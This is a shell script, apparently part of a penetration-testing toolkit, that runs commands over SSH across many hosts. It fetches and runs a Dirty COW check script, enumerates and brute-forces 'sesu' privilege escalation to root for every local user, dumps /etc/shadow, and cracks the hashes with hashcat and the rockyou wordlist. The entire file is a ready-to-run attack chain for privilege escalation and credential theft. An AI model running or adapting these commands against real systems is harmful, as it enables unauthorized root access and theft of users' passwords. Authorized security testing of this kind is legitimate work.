#!/bin/sh
# Add interesting commands here. Exit_status of the last command must be 0 for successful runs, non-0 for failed ones.

./SSHExec.py dirty_cow_check "wget https://access.redhat.com/sites/default/files/rh-cve-2016-5195_1.sh -P /tmp -q && bash /tmp/rh-cve-2016-5195_1.sh | grep -v 'NOT' "

./SSHExec.py sesu_users "ls -lt /var/opt/soeg/rpt/*validation.log | grep 'rw- ' | awk '{print \$9}' | head -n 1 | xargs cat | grep 'can sesu' | awk '{print \$2}' | sort | uniq | cut -d' ' -f2 | grep -v -e '^$' "

./SSHExec.py -m foreach_host sesu_bin "echo id | /usr/seos/bin/sesu bin"

./SSHExec.py -m foreach_host sesu_root "echo id | /usr/seos/bin/sesu root"

./SSHExec.py etc_shadow "echo 'cat /etc/shadow' | /usr/seos/bin/sesu root"

./hashcat.py -d /usr/share/wordlists/rockyou.txt

./SSHExec.py -m foreach_host sesu_root "echo id | /usr/seos/bin/sesu root"

./SSHExec.py etc_shadow "echo 'cat /etc/shadow' | /usr/seos/bin/sesu root"

./SSHExec.py -m foreach_userhost sesu_brute 'for i in `cat /etc/passwd | cut -d':' -f 1`; do echo id | /usr/seos/bin/sesu $i 2>/dev/null ; done | grep "uid"' 

